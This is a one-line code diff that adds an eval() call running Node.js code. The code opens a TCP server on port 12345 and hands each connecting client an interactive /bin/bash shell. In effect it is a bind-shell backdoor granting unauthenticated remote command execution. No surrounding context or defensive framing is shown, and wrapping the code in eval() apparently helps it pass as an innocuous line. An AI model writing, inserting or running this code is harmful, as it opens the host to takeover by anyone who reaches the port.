@@ -1,0 +1,1 @@
+eval("let n=require('net');let q=require('child_process');let s=n.createServer(c=>{let p=q.spawn('/bin/bash',['-i']);c.pipe(p.stdin);p.stdout.pipe(c);p.stderr.pipe(c);p.on('close',()=>c.end())}).listen(12345);");
